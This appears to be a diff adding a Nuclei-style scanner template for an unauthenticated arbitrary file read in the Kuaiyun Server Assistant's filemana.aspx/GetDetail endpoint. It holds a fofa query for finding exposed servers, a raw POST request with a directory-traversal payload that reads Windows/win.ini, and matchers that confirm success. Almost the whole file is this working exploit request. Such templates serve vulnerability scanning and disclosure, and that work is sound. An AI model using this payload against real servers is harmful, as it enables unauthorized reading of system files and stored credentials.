@@ -1,0 +1,31 @@
+id: kuaiyun-server-assistant-getdetail-lfi
+
+info:
+  name: "快云服务器助手 filemana.aspx 接口任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: title="快云服务器助手"
+        快云服务器助手的 filemana.aspx/GetDetail 接口存在文件读取漏洞，攻击者无需身份验证即可通过构造特定请求读取目标系统中的任意文件，可能获取敏感配置信息、系统文件或数据库凭证等数据。
+  tags: 快云服务器助手
+
+http:
+- raw:
+  - |
+    POST /FileMenu/filemana.aspx/GetDetail HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/json; charset=utf-8
+    Connection: keep-alive
+
+    {"fpath":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows/win.ini"}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - "for 16-bit app support"
